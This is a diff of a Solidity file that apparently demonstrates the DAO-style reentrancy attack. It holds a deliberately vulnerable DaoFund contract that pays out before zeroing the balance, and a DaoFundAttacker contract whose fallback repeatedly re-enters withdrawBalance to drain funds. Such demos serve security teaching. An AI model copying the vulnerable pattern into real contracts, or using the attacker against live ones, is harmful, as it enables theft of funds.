@@ -2,31 +2,31 @@ pragma solidity ^0.4.18;
 
 contract DaoFund{
 
-   mapping(address=>uint) userBalances;
+   mapping(address=>uint) balanceOf;
 
    event WithdrawBalance(string message,uint gas);
 
    function getUserBalance(address user) external view returns(uint) {
-     return userBalances[user];
+     return balanceOf[user];
    }
 
    function addToBalance() external payable {
-     userBalances[msg.sender] = userBalances[msg.sender] + msg.value;
+     balanceOf[msg.sender] = balanceOf[msg.sender] + msg.value;
    }
 
    function withdrawBalance() external {
-     uint amountToWithdraw = userBalances[msg.sender];
+     uint amountToWithdraw = balanceOf[msg.sender];
     WithdrawBalance("withdrawBalance",msg.gas);
      if (msg.sender.call.value(amountToWithdraw)() == false) {
          revert();
      }
-     userBalances[msg.sender] = 0;
+     balanceOf[msg.sender] = 0;
    }
 }
 
 contract DaoFundAttacker{
    address fundAddress;
-   uint goalAmount;
+   int goalAmount;
    
    event WithdrawBalance(string message,uint gas);
 
@@ -36,9 +36,10 @@ contract DaoFundAttacker{
 
    function() public payable {
 
-       if( goalAmount > msg.value)
+       goalAmount -= int(msg.value);
+
+       if( goalAmount > 0 )
        {
-            goalAmount -= msg.value;
            if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
                WithdrawBalance("Failed in fallback",msg.gas);
            }
@@ -56,7 +57,7 @@ contract DaoFundAttacker{
    }
 
    function  withdraw(uint _goalAmount) public {
-       goalAmount = _goalAmount * 1 ether;
+       goalAmount = int(_goalAmount * 1 ether);
        
         if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))==false ) {
                WithdrawBalance("Failed in withdraw",msg.gas);
